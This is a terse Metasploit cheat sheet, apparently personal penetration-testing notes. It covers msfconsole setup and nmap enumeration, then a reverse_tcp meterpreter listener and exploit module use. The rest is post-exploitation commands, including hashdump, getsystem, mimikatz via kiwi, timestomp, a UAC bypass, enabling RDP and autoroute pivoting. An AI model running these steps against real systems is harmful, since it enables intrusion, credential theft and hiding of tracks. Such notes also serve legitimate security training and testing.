# starting
-   `systemctl enable postgresql`
-   `msfdb init`
-   `msfconsole`
-   `db_status`

# configure
-   `show -h`
-   `setg` set variable globally
-   `get`
-   `unset`
-   `save` save settings

# enumerate
-   `db_nmap -sV <ip>`
-   `hosts`
-   `services`
-   `vulns`
-   `connect` nc like functionality

# run listener
- `use multi/handler`
- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `set LHOST <ip>`
- `set LPORT <port>`
- `exploit -j`
# exploit
-   `search <searchterm>`
-   `show exploits`
-   `use /path/to/module`
-   `back` 
-   `info` get module info for loaded module
-   `show options` show configurations for module
-   `set <option>`
-   `show payloads` show available payloads for selected module
-   `exploit` run exploit

# post 
## meterpreter
- `ps -U <user>`
- `migrate` requires SYSTEM user
- `getsystem`
- `getuid`
- `sysinfo`
- `getpid`
- `getprivs`
- `ipconfig`
- `background`
- `shell`
- `download` / `upload`
- `help`
- `hashdump`
- `timestomp` mod file metadata
- `load kiwi` mimikatz - get process under same user / arch as lsass
- `run autoroute -s 172.18.1.0 -n 255.255.255.0`
- `run post/multi/recon/local_exploit_suggester`
- `run run post/windows/gather/win_privs`
- `post/windows/manage/enable_rdp`

## modules
- `auxiliary/server/socks5` proxy
- `use exploit/windows/local/bypassuac`
- `sessions -u <id>` shell to meterpreter
- `use post/multi/manage/shell_to_meterpreter` shell to meterpreter